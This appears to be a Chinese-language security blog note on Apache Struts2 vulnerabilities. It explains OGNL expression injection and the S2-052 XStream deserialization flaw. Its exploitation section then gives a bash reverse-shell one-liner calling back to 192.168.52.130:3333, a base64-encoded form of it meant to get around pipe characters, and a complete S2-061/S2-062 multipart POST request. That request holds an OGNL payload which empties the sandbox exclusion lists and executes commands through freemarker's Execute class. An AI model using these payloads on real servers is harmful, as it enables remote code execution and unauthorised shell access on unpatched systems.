+++
ShowToc = true
TocOpen = true
title = 'Struts2'
date = 2024-10-11T14:25:59+08:00
draft = false
private = true
show_reading_time = true
categories = 'Java安全'
+++

# 一、Struts2

Struts2框架是一个用于开发Java EE网络应用程序的开放源代码网页应用程序架构。它利用并延伸了Java Servlet API，鼓励开发者采用MVC架构。Struts2以WebWork优秀的设计思想为核心，吸收了Struts框架的部分优点，提供了一个更加整洁的MVC设计模式实现的Web应用程序框架。

# 二、漏洞原理

Struts2设计了一套OGNL的模式来操作数据。OGNL（Object Graph Navigation Language）即对象图形导航语言，通过某种表达式语法，存取Java对象树中的任意属性、调用Java对象树的方法、同时能够自动实现必要的类型转化,是语义字符串与Java对象之间沟通的桥梁。OGNL支持对象方法调用，支持类静态的方法调用和值访问，在java中的格式：


@[类全名]@[方法名|值名]


@java.lang.String@format('foo %s', 'bar')| APP_NAME；

Struts2的漏洞数量众多，其本质都是一样的(除了S2-052以外)，都是Struts2框架执行了恶意用户传进来的OGNL表达式，可以造成“命令执行、服务器文件操作、打印回显、获取系统属性、危险代码执行”等，只不过需要精心构造不同的OGNL代码而已。

S2-052漏洞


这个漏洞也算是轰动一时，其实，跟注入OGNL表达式，达到远程代码执行的方式还不大一样，S2-052漏洞是一种XML反序列化漏洞。漏洞本质是Struts2 REST插件的XStream组件存在反序列化漏洞，当使用XStream组件对XML格式的数据包进行反序列化操作时，没有对数据内容进行有效验证，存在反序列化后远程代码执行安全隐患。

同时struts2的漏洞时间也很长，S2-001发现时间为2007年，而较近的S2-061时间为2020年，跨度很大。

# 三、漏洞特征

.action   .do的请求路径

# 四、漏洞利用

S2-057 以下直接梭哈：Struts2_工具v18.09

S2-061  S2-062

编写反弹shell代码





bash -i >& /dev/tcp/192.168.52.130/3333 0>&1





反弹shell涉及到管道符问题要将命令进行base64编码





bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjUyLjEzMC8zMzMzIDA+JjE=}|{base64,-d}|{bash,-i}

```
POST /index.action HTTP/1.1
Host: localhost:8080
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Safari/537.36
Connection: close
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryl7d1B1aGsV2wcZwF
Content-Length: 829

------WebKitFormBoundaryl7d1B1aGsV2wcZwF
Content-Disposition: form-data; name="id"

%{(#instancemanager=#application["org.apache.tomcat.InstanceManager"]).(#stack=#attr["com.opensymphony.xwork2.util.ValueStack.ValueStack"]).(#bean=#instancemanager.newInstance("org.apache.commons.collections.BeanMap")).(#bean.setBean(#stack)).(#context=#bean.get("context")).(#bean.setBean(#context)).(#macc=#bean.get("memberAccess")).(#bean.setBean(#macc)).(#emptyset=#instancemanager.newInstance("java.util.HashSet")).(#bean.put("excludedClasses",#emptyset)).(#bean.put("excludedPackageNames",#emptyset)).(#arglist=#instancemanager.newInstance("java.util.ArrayList")).(#arglist.add("id")).(#execute=#instancemanager.newInstance("freemarker.template.utility.Execute")).(#execute.exec(#arglist))}
------WebKitFormBoundaryl7d1B1aGsV2wcZwF--
```